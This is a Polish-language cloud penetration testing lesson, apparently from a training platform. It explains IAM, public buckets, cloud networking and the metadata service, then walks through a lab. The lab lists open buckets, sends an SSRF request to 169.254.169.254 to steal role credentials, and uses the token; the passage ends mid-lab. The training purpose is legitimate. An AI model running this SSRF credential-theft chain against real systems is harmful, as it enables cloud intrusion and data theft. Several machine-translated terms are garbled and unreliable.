---

Chmura to wynajmowana infrastruktura. Kiedy mówimy, że firma „działa w chmurze”, mamy na myśli, że płaci dostawcy (AWS, Azure, Google Cloud lub inny) do celów obliczeniowych, przechowywania danych i obsługi sieci dostarczanej za pośrednictwem API Zamiast kupować serwery i ustawiać je w jednym pomieszczeniu, klient klika przycisk i kilka minut później otrzymuje maszynę wirtualną.

Ma to znaczenie dla testera penetracyjnego z jednego powodu: niemal każde działanie wykracza obecnie poza granice chmury. Publiczna aplikacja internetowa firmy może działać na wirtualnej maszynie w chmurze, jej pliki w kontenerze pamięci masowej obiektów, a tożsamości w katalogu w chmurze. Jeśli nie rozumiemy prymitywnych metod ataków, których używają atakujący w tych środowiskach, tracimy wnioski, a co gorsza, tworzymy rekomendacje, które nie mają zastosowania.

W tej sali koncepcje zostaną zaprezentowane w sposób niezależny od chmury. Każde zadanie będzie wprowadzać koncepcje za pomocą ogólnych terminów, które oddają tę samą ogólną ideę w różnych chmurach. Przebieg zajęć obejmie modele wdrażania usług, tożsamość, pamięć masową, sieci i obliczenia. Na koniec odbędzie się również praktyczne ćwiczenie w symulowanym środowisku chmurowym, które przeprowadzi Cię przez skanowanie portów, przestawianie, SSRF wiązanie i eksfiltracja.

## Cele edukacyjne

- Wyjaśnij model współodpowiedzialności i zmapuj obowiązki w ramachInfrastruktura jako usługa (IaaS),PaaS, IOprogramowanie jako usługa
- PrzeczytajJA JESTEMpolityka, identyfikacja ról jako podatnych na ataki prymitywów i wykrywanie zbyt pobłażliwych dzikich kart
- Rozpoznaj publicznie ujawnione zasoby pamięci masowej w chmurze i wyjaśnij, w jaki sposób atakujący je wylicza
- Opisz prymitywy sieci chmurowych oraz typowe wzorce udostępniania usług i ruchu bocznego
- Wyjaśnij usługę metadanych instancji i łańcuch ataków SSRF-poświadczenia
- Przeprowadź kontrolowany atak niezależny od chmury na symulowane środowisko chmurowe

## Wymagania wstępne dotyczące nauki

- PodstawowyLinuxpolecenia - [Podstawy Linuksa](https://tryhackme.com/room/linuxfundamentalspart1)
- HTTPpodstawy - [Podstawy aplikacji internetowych](https://tryhackme.com/room/webapplicationbasics)
- Ogólne nastawienie atakującego z poprzednich etapów [ścieżki Jr Penetration Tester](https://tryhackme.com/path/outline/jrpenetrationtester)

Każde zaangażowanie w chmurę zaczyna się od prostego pytania: Co tak naprawdę wynajmuje klient i gdzie kończy się odpowiedzialność dostawcy? Odpowiedz na to pytanie, a będziemy wiedzieć, gdzie szukać błędów w konfiguracji. Modele usług i wdrożeń to słownictwo, które idealnie wpisuje się w tę dyskusję.

## Modele usług

Większość zjawisk, z którymi spotykamy się w praktyce, można opisać trzema skrótami. Każdy z nich można uzasadnić analogią.

- **Infrastruktura jako usługa (IaaS)(Infrastruktura jako usługa)** to wynajem surowego sprzętu obliczeniowego. Dostawca udostępnia nam maszynę wirtualną, dysk wirtualny i sieć wirtualną, a my instalujemy i uruchamiamy wszystko na niej. Wyobraźmy sobie wynajem pustego mieszkania: ściany i instalacje wodno-kanalizacyjne są na miejscu, a reszta jest po naszej stronie. Na przykład, maszyna wirtualna w chmurze obsługująca nasz własny stos internetowy.
- **PaaS(Platforma jako usługa)** to wynajem zarządzanego środowiska uruchomieniowego. Dostawca zajmuje się systemem operacyjnym, środowiskiem uruchomieniowym i często skalowaniem. Wgrywamy nasz kod lub dane, a one działają. Można to porównać do wynajmu częściowo umeblowanego mieszkania: podstawowe elementy są już skonfigurowane, można się wprowadzić i skupić na życiu, a nie na instalowaniu całej infrastruktury. Typowymi przykładami są poczta e-mail hostowana w chmurze lub pakiet do współpracy.
- **Oprogramowanie jako usługa Oprogramowanie jako usługa (Software as a Service)** to wynajem w pełni zarządzanej aplikacji. Dostawca zarządza wszystkim: infrastrukturą, platformą i samym oprogramowaniem; logujemy się przez interfejs webowy, konfigurujemy kilka ustawień i korzystamy z niego. Wyobraźmy to sobie jako wynajem pokoju hotelowego: wszystko jest gotowe do użycia, a sprzątanie, konserwacja i inne usługi są obsługiwane za nas. Dobrymi przykładami są poczta e-mail hostowana w chmurze lub pakiet narzędzi do współpracy.

## Modele wdrażania

Modele wdrażania opisują, kto jeszcze współdzieli infrastrukturę:

- **Chmura publiczna:** współdzielona infrastruktura obsługiwana przez dostawcę, nasze obciążenia znajdują się obok obciążeń innych klientów, oddzielone hiperwizorem i elementami sterującymi siecią
- **Chmura prywatna:** infrastruktura dedykowana jednej organizacji, działająca lokalnie lub hostowana
- **Chmura hybrydowa:** połączenie obu rozwiązań, z częścią obciążeń w chmurze publicznej i częścią lokalną, połączonych prywatnym łączem lubVPN
- **Chmura społecznościowa:** współdzielona infrastruktura między organizacjami o wspólnych wymaganiach, na przykład chmura rządowa lub należąca do regulowanego sektora

## Model współodpowiedzialności

Wiele incydentów związanych z bezpieczeństwem chmury ma miejsce, ponieważ klienci nie rozumieją, gdzie zaczyna się i kończy ich odpowiedzialność. Dostawca zawsze zabezpiecza fizyczne centrum danych, sprzęt i hiperwizor. Klient zawsze jest właścicielem swoich danych, tożsamości i zasad dostępu do swoich zasobów. Interesującym elementem, miejscem, w którym kumulują się błędne konfiguracje, jest środek: system operacyjny, środowisko uruchomieniowe i konfiguracja sieci. Ten środek zmienia się w zależności od modelu usługi.

|Warstwa|Infrastruktura jako usługa (IaaS)|PaaS|Oprogramowanie jako usługa|
|---|---|---|---|
|Fizyczne centrum danych|Dostawca|Dostawca|Dostawca|
|Sprzęt i hiperwizor|Dostawca|Dostawca|Dostawca|
|Konfiguracja sieci|Klient|Wspólny|Dostawca|
|System operacyjny|Klient|Dostawca|Dostawca|
|Środowisko wykonawcze i oprogramowanie pośredniczące|Klient|Dostawca|Dostawca|
|Kod aplikacji|Klient|Klient|Dostawca|
|Dane|Klient|Klient|Klient|
|Tożsamości i dostęp|Klient|Klient|Klient|

Jako atakujący, nie znajdujemy błędów w hypervisorze podczas standardowej interakcji. Znajdujemy błędy lub zwykłe pomyłki, w których klient miał coś zrobić, ale tego nie zrobił. Maszyna wirtualna pozostawiona z domyślnym hasłem, kontener pamięci masowej upubliczniony i polityka z przypisaną akcją wieloznaczną. Model Współodpowiedzialności to mapa, która wskazuje nam, gdzie szukać.

## Wywołania dostawców

Każdy dostawca ma własne nazwy dla tych samych pomysłów. Oto kilka przykładów, z którymi najczęściej się spotkasz.

|Model|AWSprzykład|Przykład Azure|Przykład Google Cloud|
|---|---|---|---|
|Infrastruktura jako usługa (IaaS)|EC2przykład|Maszyna wirtualna Azure|Silnik obliczeniowyMaszyna wirtualna|
|PaaS|RDS, elastyczna łodyga fasoli|LazurSQLBaza danych, usługa aplikacji|Cloud SQL, App Engine|
|Oprogramowanie jako usługa|Amazon WorkMail|Microsoft 365|Google Workspace|

Tożsamość to punkt wyjścia większości zagrożeń dla chmury. Wyciek klucza dostępu lub rola ze zbyt wieloma uprawnieniami jest dziewięć razy skuteczniejsza niż exploit powodujący uszkodzenie pamięci w rzeczywistym środowisku. Zbudujmy minimalny model mentalny potrzebny do odczytania polityki, rozpoznania, jakie role faktycznie nam pozwalają, i dowiedzmy się, o co pytać w pierwszej kolejności, gdy otrzymamy zestaw danych uwierzytelniających.

## Polityki to tylko dokumenty

ChmuraJA JESTEMpolityka jestJSONDokument określający, kto może co robić i jakie zasoby. Najważniejsze znaczenie mają trzy pola:

- **Efekt:** `Allow` lub`Deny`
- **Działanie:** operacje objęte polityką, takie jak `storage:GetObject`lub`iam:CreateUser`
- **Zasób:** konkretny zasób, do którego odnosi się działanie, zwykle wyrażony jako identyfikator specyficzny dla dostawcy

Oto prosty przykład dobrze określonej polityki:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "storage:GetObject",
      "Resource": "bucket/reports/*"
    }
  ]
}
```

To przyznaje pojedynczą akcję dla jednego prefiksu kontenera. Porównaj to z tym:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

Ta sama struktura, ale zupełnie inny promień rażenia. Symbol wieloznaczny ( `*`) w polu `Action`i `Resource`oznacza, że ​​tożsamość przechowująca tę politykę może zrobić wszystko, co zechce. Kiedy odczytujemy politykę, pierwszą rzeczą, której szukamy, są symbole wieloznaczne w tych dwóch polach.

Dwie uwagi, zanim przejdziemy dalej. `storage:`Prefiks w tych przykładach to ogólny prefiks, którego używamy w całej sali, podczas gdy prawdziwi dostawcy używają własnych prefiksów usług ( `s3:`w AWS, w Azure i Google Cloud obowiązują różne konwencje nazewnictwa). Powyższy kształt JSON to język zasad AWS IAM; Azure RBAC i Google Cloud IAM wyrażają te same idee za pomocą różnych struktur, ale dyscyplina odczytu polega na znajdowaniu efektów, sprawdzaniu akcji i transferach zasobów wszędzie.

## Role i przejmowanie ról

Użytkownicy i grupy wyglądają znajomo w każdym katalogu korporacyjnym. Najważniejszym elementem jest dla nas **rola** . Rola to nazwany zestaw uprawnień, które tożsamość może tymczasowo przyjąć. Zamiast przyznawać użytkownikowi wszystkie uprawnienia, których może potrzebować, organizacje tworzą role, dołączają do nich zasady i pozwalają użytkownikom lub obciążeniom przyjąć rolę, gdy będą ich potrzebować.

Gdy tożsamość przejmuje rolę, dostawca chmury przekazuje tymczasowe dane uwierzytelniające, których zakres jest zgodny z politykami tej roli. Jako atakujący, przejmujemy rolę z dwóch powodów:

- Zagrożony użytkownik lub obciążenie często ma prawo przyjąć bardziej uprzywilejowaną rolę, co jest naszą ścieżką eskalacji uprawnień
- Usługa metadanych instancji udostępnia tymczasowe dane uwierzytelniające dla roli powiązanej z maszyną wirtualną. Wystarczy je pobrać i już jesteśmy w tej roli.

## Podejście do wyliczania IAM

Za każdym razem, gdy zdobędziemy zestaw danych uwierzytelniających do chmury, niezależnie od tego, czy pochodzi on z wyciekłego `.aws/credentials`pliku, SSRF odpowiedź lub zagrożona usługa, pierwsze pytanie powinno brzmieć: „Co mogę z tym zrobić?”.

Na poziomie koncepcyjnym nasza mentalna lista kontrolna wygląda następująco:

1. Do której tożsamości należą te dane uwierzytelniające?
2. Jakie zasady są stosowane bezpośrednio lub za pośrednictwem grupy?
3. Jakie role może przyjąć ta tożsamość?
4. Czy któraś z tych zasad jest zbyt pobłażliwa (dzika)?
5. Które zasoby są objęte zakresem: pojedynczy zasób czy całe konto?

Każdy dostawca ma polecenia i APIwywołania, które odpowiadają na te pytania. Pomijamy tutaj narzędzia, ponieważ wzorzec ma większe znaczenie niż składnia, a ścieżka Jr Penetration Tester ma specyficzne dla dostawcy pokoje dla narzędzi.

## Jedyny wzorzec słabości, który warto znać

Jeśli mielibyśmy zapamiętać tylko jeden schemat ataku IAM, to jest to: **zbyt liberalne zasady w połączeniu z ujawnionymi kluczami** .

Klucze dostępu ciągle trafiają w niewłaściwe miejsca, a atakujący wykorzystują je wszystkie: 

- Zobowiązani do korzystania z publicznych repozytoriów kodu.
- Wbudowany wpojemnikobrazy przesłane do rejestru publicznego.
- Zapisano w pliku konfiguracyjnym, którego kopia zapasowa została utworzona w publicznym kontenerze.
- Wydrukowano na zrzucie ekranu załączonym do zgłoszenia.

Same klucze to tylko ciągi znaków. Stają się naruszeniem, gdy tożsamość, która za nimi stoi, ma zbyt liberalną politykę. Klucz programisty z działaniem symbolu wieloznacznego w głównym kontenerze firmy, to tylko jeden błąd od wycieku danych. Tak wygląda większość incydentów związanych z chmurą, o których donoszą media, i to właśnie tej kombinacji szukamy przy każdym zdarzeniu.

## Wywołania dostawców

|Pojęcie|AWS|Lazur|Chmura Google|
|---|---|---|---|
|Usługa tożsamości|JA JESTEM|Identyfikator Microsoft Entra|Chmura IAM|
|Długotrwałe poświadczenie|Identyfikator klucza dostępu + sekret|ID klienta + sekret lub logowanie użytkownika|Klucz konta usługi lub logowanie użytkownika|
|Równoważnik roli|Rola IAM|Tożsamość zarządzana|Konto usługi|

Publiczne kontenery pamięci masowej w chmurze to najczęstsze źródło nagłówków dotyczących naruszeń bezpieczeństwa. Schemat jest zawsze ten sam: ktoś utworzył kontener, przesłał coś, czego nie chciał ujawnić światu, i źle skonfigurował kontrolę dostępu. Naszym zadaniem, jako atakujących, jest znalezienie tych kontenerów i wykorzystanie tego, co serwują.

## Podstawy przechowywania obiektów

Przechowywanie obiektów jest płaskieprzestrzeń nazwpojemników (zwanych wiadrami na AWS i Google Cloud oraz kontenery na platformie Azure, które przechowują obiekty. Obiekt to plik wraz z metadanymi. Dostęp do każdego obiektu można uzyskać za pomocą adresu URL w postaci `https://<provider-endpoint>/<bucket-name>/<object-key>`.

Na każdej platformie występują trzy podstawowe mechanizmy kontroli dostępu:

- **Zasady dotyczące kontenerów** (w stylu IAM): główna reguła dostępu, dokument JSON podobny do tego, który widzieliśmy w zadaniu 3
- **ACL (listy kontroli dostępu):** starsze reguły dostępu dla poszczególnych obiektów, prostsze, ale bardziej podatne na błędy
- **Podpisane adresy URL** (nazywane również wstępnie podpisanymi adresami URL): łącza o ograniczonym czasie działania, z których może korzystać każda osoba posiadająca dany adres URL, nawet bez konieczności podawania danych uwierzytelniających

Każda z nich zawodzi inaczej. Zasady dotyczące kontenerów zawodzą, gdy ktoś zapisuje dane `"Principal": "*"`. Listy kontroli dostępu (ACL) zawodzą, gdy ktoś ustawia „publiczny odczyt”, nie zdając sobie sprawy, że kontener jest już publiczny. Podpisane adresy URL zawodzą, gdy klucz podpisu wycieka lub wygaśnięcie jest ustawione na dekadę później.

## Jak wiadra trafiają do użytku publicznego

Cztery wzorce obejmują większość rzeczywistych zdarzeń:

1. **Domyślne ustawienia, które pozostają bez zmian podczas tworzenia.** Deweloper tworzy kontener do testowania, upublicznia go, aby uniknąć problemów z uprawnieniami, i zapomina o jego ograniczeniu przed wypełnieniem kontenera rzeczywistymi danymi.
2. **Blokada dostępu publicznego jest celowo wyłączana.** Dostawcy dostarczają teraz przełącznik najwyższego poziomu, który blokuje dostęp publiczny, nawet gdy indywidualne zasady na to pozwalają. Wyłączenie go, aby coś działało, ujawnia wszystko.
3. **Zasady wieloznaczne w politykach.** Polityka `"Principal": "*"`oznacza dowolną tożsamość w internecie.
4. **Wyciekłe lub długo istniejące podpisane adresy URL.** Adres URL ważny przez pięć lat, zamieszczony w zgłoszeniu, zostaje zindeksowany przez wyszukiwarki.

## Przepływ pracy atakującego

Nasze podejście do wykrywania odsłoniętych pamięci masowych jest metodyczne:

1. **Zidentyfikuj nazwy kontenerów.** Nazwy kontenerów często podążają za wzorcami:  `<company>-backups`, `<company>-dev`, `<company>-prod`, `<company>-assets`. Łączymy nazwę firmy z popularnymi sufiksami i badamy.
2. **Punkty końcowe dostawcy sondy.** Wysyłamy żądanie HTTP do publicznego adresu URL dostawcy dla każdej nazwy kandydata. Jeśli kontener istnieje i jest publiczny, otrzymujemy listę lub potwierdzenie.
3. **Wyświetla kontener.** Gdy lista jest publiczna, zwykłe żądanie GET do adresu URL kontenera zwraca indeks wszystkich obiektów. Przeszukujemy pliki w poszukiwaniu interesujących nazw.
4. **Pobierz produkty.** Wszystko, co jest na liście, jest dostępne do wglądu, bez konieczności podawania danych uwierzytelniających.

Narzędzia takie jak `s3scanner`, `cloud_enum`, i proste `curl`jednolinijkowce automatyzują ten proces. Technika ta wymaga głównie cierpliwości i dobrego doboru słów, a nie sprytnego wykorzystania luk w zabezpieczeniach.

## Co trafia do otwartych wiader

Artefakty, które traktujemy priorytetowo, w kolejności od najcenniejszych:

- **Kopie zapasowe.** Zrzuty baz danych, migawki całego dysku, kopie zapasowe konfiguracji. Wszystko w jednym pliku.
- **Kod źródłowy i artefakty kompilacji.** Zakodowane na stałe sekrety, wewnętrzna dokumentacja API, nieopublikowane funkcje.
- **Pliki konfiguracyjne.** `.env` pliki, `credentials.json`,Kuberneteskonfiguracja,CI/płyta CDtajniki.
- **Dzienniki.** Adresy e-mail użytkowników, tokeny sesji, wewnętrzneAdresy IP, a czasami hasła są również zawarte w komunikatach o błędach.
- **Dane klientów.** Tabele adresów e-mail, adresów, identyfikatorów płatności i dokumentów osobistych.

Pojedynczy, publicznie dostępny plik kopii zapasowej jest często bardziej efektywny niż wszystkie inne techniki razem wzięte.

## Wywołania dostawców

|Pojęcie|AWS|Lazur|Chmura Google|
|---|---|---|---|
|Usługa magazynowania|AmazonkaS3|Magazyn obiektów blob platformy Azure|Przechowywanie w chmurze Google|
|Jednostka pamięci masowej|Wiaderko|Pojemnik|Wiaderko|
|Kształt publicznego adresu URL|https://<zasobnik>.s3.amazonaws.com/<klucz>|https://<konto>.blob.core.windows.net/<kontener>/<blob>|https://storage.googleapis.com/<zasobnik>/<obiekt>|
|Dostęp do dokumentu|Polityka wiaderkowa,JA JESTEMpolityka,Lista kontroli dostępu|Podpis dostępu współdzielonego,RBAC, poziom dostępu publicznego|Polityka IAM, lista kontroli dostępu, podpisany adres URL|

Gdy już wiemy, co obiekt docelowy wynajmuje od chmury, kolejne pytanie jest proste: co jest faktycznie osiągalne i co możemy zrobić, gdy już zdobędziemy w nim punkt zaczepienia. Sieci chmurowe odpowiadają na oba te pytania. Prymitywy są podobne u różnych dostawców, nawet jeśli różnią się nazwami.

## Bloki konstrukcyjne

Sieć **wirtualna** (czasami nazywanaSieć VPC(ang. Virtual Private Cloud, w skrócie: wirtualna chmura prywatna) to prywatna sieć, którą klient tworzy w sieci dostawcy. Ma ona własny zakres adresów IP i jest odizolowana od wirtualnych sieci innych klientów, chyba że ktoś celowo je połączy.

Podsieć to wycinek tej wirtualnej sieci. Podsieci zazwyczaj dzielą się na **publiczną** i **prywatną** . Podsieć publiczna ma drogę do internetu przez bramę internetową (ang. Internet Gateway) **.**IGW), co umożliwia zasobom wewnątrz sieci dotarcie do świata zewnętrznego. Prywatna podsieć nie ma takiej trasy. Zasoby w prywatnej podsieci mogą się ze sobą komunikować, ale nic z internetu nie może do nich dotrzeć bezpośrednio.

Dwazapora sieciowaprymitywy znajdują się na szczycie tej struktury:

- **Grupy zabezpieczeń (SG)** działają jak zapory sieciowe na poziomie instancji. Są stanowe, co oznacza, że ​​jeśli żądanie wychodzące zostanie dopuszczone, odpowiedź jest automatycznie dopuszczana. Grupy zabezpieczeń domyślnie blokują ruch, a reguły mogą jedynie zezwalać na ruch, co oznacza, że ​​jeśli ruch nie pasuje do reguły, jest automatycznie odrzucany.
- **Sieciowe listy kontroli dostępu (NACL)** znajdują się na poziomie podsieci. Są bezstanowe, więc oba kierunki muszą być jawnie dozwolone. Listy NACL zawierają zarówno reguły zezwalające, jak i blokujące, co czyni je przydatnymi w przypadku szerokich bloków.

Praktyczna różnica polega na tym, że grupy zabezpieczeń stanowią główną kontrolę, z jaką spotykamy się w praktyce, a listy NACL stanowią mniej szczegółową sieć bezpieczeństwa, której wielu klientów nigdy nie zmienia z domyślnych ustawień.

## Skupienie atakującego 1: Odsłonięte porty

Najczęstszym błędem w konfiguracji chmury jest reguła grupy zabezpieczeń, która zezwala `0.0.0.0/0`(na cały internet) na porcie, na który nie powinien. Kiedy widzimy cel w chmurze, naszym pierwszym pytaniem zawsze jest, co jest narażone i komu.

Typowe przykłady pojawiające się w raportach:

- SSH (port 22) otwarty `0.0.0.0/0`na hoście bastionowym, który powinien akceptować tylko adres IP serwera przeskokowego
- Porty baz danych (3306 dla MySQL, 5432 dla PostgreSQL, 27017 dla MongoDB) otwarte dla całego Internetu
- Do paneli administracyjnych na portach 8080 lub 9000 można uzyskać dostęp bezVPN
- StaryRDP(3389) reguł dodanych podczas migracji i nigdy nieusuniętych

Znajdziemy je podczas zwykłego skanowania portów iHTTPsondy. Chmura nie zmienia narzędzi, zmienia jedynie łatwość popełnienia błędu.

## Skupienie atakującego 2: Ruch boczny

Inną zaletą sieci chmurowej jest możliwość ruchu poziomego. Po naruszeniu zabezpieczeń instancji w sieci wirtualnej zazwyczaj okazuje się, że sieć wewnętrzna jest płaska, a każda instancja może domyślnie połączyć się z każdą inną instancją na większości portów. To zupełnie inna sytuacja niż w przypadku dobrze posegmentowanej sieci lokalnej, gdzie zapory sieciowe znajdują się pomiędzy każdą strefą.

W praktyce oznacza to, że pojedynczy naruszony serwer internetowy w sieci wirtualnej ma często bezpośredni dostęp do:

- Wewnętrzne bazy danych i pamięci podręczne
- Inne serwery aplikacji
- Panele administracyjne tylko dla użytkowników wewnętrznych
- Punkty końcowe metadanych usługi

Nasza lista kontrolna po zdobyciu przyczółka zaczyna się od pytania: „Do czego jeszcze w tej wirtualnej sieci mogę dotrzeć?”, a odpowiedź zazwyczaj brzmi: „Więcej niż się spodziewałem”.

## Wywołania dostawców

| Pojęcie             | AWS                              | Lazur                                 | Chmura Google                                                                                                              |
| ------------------- | -------------------------------- | ------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| Sieć wirtualna      | Sieć VPC                         | Sieć wirtualna (VNet)                 | Sieć VPC                                                                                                                   |
| Podsieć             | Podsieć                          | Podsieć                               | Podsieć                                                                                                                    |
| Dostęp do Internetu | Brama internetowa                | Publiczny adres IP (lub bramka NAT)   | domyślna trasa + zewnętrzny adres IP (Cloud NAT dla prywatnych maszyn wirtualnych obsługujących wyłącznie ruch wychodzący) |
| Zapora instancji    | Grupa Bezpieczeństwa             | Grupa Bezpieczeństwa Sieciowego (NSG) | Reguła zapory sieciowej                                                                                                    |
| Zapora podsieci     | SiećLista kontroli dostępu(NACL) | Grupa NSG w zakresie podsieci         | Reguła zapory sieciowej w zakresie znacznika sieciowego                                                                    |

Chmura obliczeniowa to miejsce, gdzie nasze znane umiejętności spotykają się z nowymi prymitywami. Maszyna wirtualna w chmurze nadal działa. Linux lub Windows, nadal ma otwarte porty i nadal ma użytkowników. Prawdziwą nowością jest usługa metadanych instancji, czyli mały wewnętrzny punkt końcowy, który udostępnia tożsamość instancji. Zrozumienie IMDS zmienia powszechną lukę w zabezpieczeniach sieci w pełne zagrożenie dla chmury.

## Instancje i obrazy

**Instancja** w chmurze to maszyna wirtualna wynajmowana od dostawcy. Wybieramy **obraz** (szablon systemu operacyjnego i preinstalowane oprogramowanie), określamy rozmiar, a dostawca przekazuje nam działającą maszynę wirtualną z publicznym lub prywatnym adresem IP. Wszystko, co wiemy o atakach na systemy Linux i Windows, nadal ma zastosowanie: uruchomione usługi, słabe hasła, niezałatane kernele, źle skonfigurowane aplikacje – wszystko.

## Usługa metadanych instancji

Każda instancja chmury może wykonać małe zapytanie HTTP Punkt końcowy, aby dowiedzieć się o sobie. Ten punkt końcowy nazywa się **Instance Metadata Service (IMDS)** . Jest on dostępny tylko z poziomu instancji, zazwyczaj pod adresem lokalnym łącza `169.254.169.254`. Dotyczy to AWS i Azure, natomiast Google Cloud używa nazwy hosta `metadata.google.internal`.

Powód istnienia tego punktu końcowego jest logiczny. Obciążenie działające na instancji często musi znać swoje własne identyfikatory (region, identyfikator instancji), konfigurację startową (skrypt, który użytkownik poprosił instancję o uruchomienie podczas rozruchu) oraz, co najważniejsze, tymczasowe dane uwierzytelniające dla każdej roli przypisanej do instancji. Zakodowanie danych uwierzytelniających na stałe w aplikacji byłoby jeszcze gorsze; każdy, kto czyta kod źródłowy, również je zobaczy. IMDS pozwala obciążeniu na pobieranie ich na żądanie.

Z punktu widzenia atakującego IMDS jest małym serwerem HTTP, który udostępnia dane uwierzytelniające każdemu, kto o nie poprosi.

## IMDSv1 to to, co pojawia się w raportach

IMDS ma dwie wersjeAWS, a rozróżnienie to jest tym, o czym w końcu wspomina każdy raport pentestowy dotyczący środowiska chmurowego.

**IMDSv1** odpowiada na każde żądanie HTTP GET. Bez uwierzytelniania, tokena sesji i wymaganych nagłówków. Żądania przychodzą, a dane uwierzytelniające wychodzą. Ta wersja jest dla nas najważniejsza, ponieważ można do niej dotrzeć bezpośrednio poprzez luki w zabezpieczeniach po stronie serwera.

**IMDSv2** wymaga tokena sesji uzyskanego poprzez żądanie PUT ze specjalnym nagłówkiem. Ten dodatkowy krok blokuje najpopularniejszy ładunek SSRF. AWS od lat namawia klientów do korzystania z IMDSv2, ale IMDSv1 jest nadal dostępny jako rozwiązanie awaryjne dla starszych obrazów, a klienci często go nie wyłączają.

## Łańcuch SSRF-do-poświadczeń

Oto łańcuch ataków, który obserwujemy w przypadku niemal każdego zaangażowania w chmurze obejmującego aplikację internetową:

1. Znajdujemy aplikację internetową, która pobiera adresy URL w imieniu serwera. Importer obrazów, tester webhooków i funkcję „podglądu linku”. Wszystko, co pobiera od nas adres URL i przekazuje go serwerowi.
2. Zazwyczaj jako cel przesyłamy adres URL IMDS `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. Nazwę roli można znaleźć, najpierw wysyłając zapytanie do ścieżki nadrzędnej `/latest/meta-data/iam/security-credentials/`, która ją zwraca.
3. Instancja pobiera adres URL. Ponieważ żądanie pochodzi z wewnątrz, usługa metadanych odpowiada.
4. Serwer zwraca nam odpowiedź w postaci metadanych, która zawiera dokument JSON z `AccessKeyId`, `SecretAccessKey`, `Token`i czasem wygaśnięcia.
5. Teraz wcielamy się w rolę przypisaną danej instancji, z wszystkimi uprawnieniami, jakie przyznaje jej polityka, spoza środowiska.

Włamanie do systemu Capital One w 2019 roku było podręcznikowym przykładem tego łańcucha. Źle skonfigurowana zapora sieciowa aplikacji internetowej umożliwiła atakującemu wygenerowanie żądania SSRF do systemu IMDS, pobranie danych uwierzytelniających role i odczytanie danych z ponad 100 milionów rekordów klientów.

## Inne formularze obliczeniowe, które warto znać

Trzy kolejne formy obliczeniowe mają własne historie tożsamości i metadanych. Omówimy je pokrótce tutaj i omówimy szczegółowo w kolejnych salach.

- **Migawki dysków** to kopie dysku danej instancji w danym momencie. Klienci czasami udostępniają migawki publicznie (celowo lub przez pomyłkę). Publiczna migawka to w zasadzie otwarty dysk twardy.
- **Funkcje bezserwerowe** uruchamiają kod na żądanie bez trwałej maszyny wirtualnej. AWS Lambda, Azure Functions, Google Cloud Functions. Każda funkcja ma własną tożsamość i zmienne środowiskowe, a SSRF wewnątrz funkcji kieruje do punktu końcowego metadanych funkcji, a nie instancji.
- **Kontenery** działają w oparciu o usługi zarządzane (AWS ECS i EKS, Azure Container Instances i AKS, Google Cloud Run i GKE). Każdy kontener zazwyczaj ma własną tożsamość i punkt końcowy w stylu metadanych, a ten sam wzorzec SSRF pojawia się ponownie z różnymi adresami URL.

## Wywołania dostawców

|Pojęcie|AWS|Lazur|Chmura Google|
|---|---|---|---|
|Przykład|EC2|Maszyna wirtualna|Maszyna wirtualna Compute Engine|
|Punkt końcowy metadanych|`http://169.254.169.254/latest/meta-data/`|`http://169.254.169.254/metadata/instance?api-version=...`(wymaga `Metadata: true`nagłówka)|`http://metadata.google.internal/`(wymaga `Metadata-Flavor: Google`nagłówka)|
|Metadane z tokenem|IMDSv2 wymaga PUT + tokenu sesji|Nagłówek wymagany domyślnie|Nagłówek wymagany domyślnie|
|Bezserwerowy|Lambda|Funkcje Azure|Funkcje w chmurze, Cloud Run|
|Zarządzane kontenery|ECS,EKS,Fargate|ACI,AKS|Cloud Run, GKE|

Wdróż laboratorium za pomocą zielonego  przycisku **Start Machine** i pola Attack Box. Poczekaj, aż maszyna się uruchomi, a następnie zanotuj jej adres IP. Będziemy się do niego odwoływać `MACHINE_IP`w dalszej części zadania.

## Krok 1: Rozpoznanie sieci

Zacznij od skanowania portów w urządzeniu docelowym, aby zidentyfikować, co jest narażone.

Skanowanie portów

```shell-session
nmap MACHINE_IP
```

Skanowanie pokazuje porty `8080`i `9000`. Port  `9000`to usługa przechowywania obiektów. Port `8080`to mała aplikacja internetowa o nazwie **ImageFetcher** . Ta aplikacja jest naszym kandydatem na SSRF.

## Krok 2: Enumeracja publicznego wiadra

Usługa przechowywania obiektów na porcie 9000 wyświetla listę kontenerów w przypadku dostępu bez uwierzytelniania. Zacznij od listy głównej.

Katalog główny magazynu

```shell-session
curl http://MACHINE_IP:9000/
```

Korzeń pokazuje dwa kontenery `dev-assets`i  `prod-secrets`. `dev-assets`Kontener można wyświetlić na liście.

Wyświetl listę zasobów deweloperskich

```shell-session
curl http://MACHINE_IP:9000/dev-assets/
```

Na liście wyróżnia się plik o nazwie `dev-notes.txt`. Przeczytajmy go.

Przeczytaj dev-notes.txt

```shell-session
curl http://MACHINE_IP:9000/dev-assets/dev-notes.txt
```

Notatka informuje nas o aplikacji ImageFetcher na porcie 8080 i wspomina o funkcji pobierania adresów URL pod adresem `/fetch?url=`. Wspomina również o nazwie roli przypisanej do instancji: `web-app-role`. To jest fragment, który jest nam potrzebny do następnego kroku.

## Krok 3: SSRF w stosunku do usługi metadanych

Aplikacja ImageFetcher pobiera dowolny adres URL, który jej podamy, i zwraca treść odpowiedzi. To jest dokładnie ten prymityw, którego potrzebujemy, aby dotrzeć do usługi metadanych w `169.254.169.254`. Wskaż  `URL`parametr na ścieżkę danych uwierzytelniających IAM dla  `web-app-role`roli.

SSRF do IMDS

```shell-session
curl "http://MACHINE_IP:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"
```

Odpowiedzią jest dokument JSON zawierający pola `AccessKeyId`,  `SecretAccessKey`,  `Token`i  . To jest wartość, którą musimy zachować.`Expiration``AccessKeyId`

## Krok 4: Przeczytaj Politykę IAM

Usługa pamięci masowej ma punkt końcowy administratora, który zwraca politykę IAM dołączoną do naszej roli, ale wymaga prawidłowego tokena. W tym symulatorze token jest przechowywany w nagłówku `X-Simulated-Token`. Przekaż klucz dostępu, który właśnie uzyskaliśmy.

Przeczytaj politykę

```shell-session
curl -H "X-Simulated-Token: AKIATHM1234FAKEKEY0" http://MACHINE_IP:9000/admin/policy.json
```

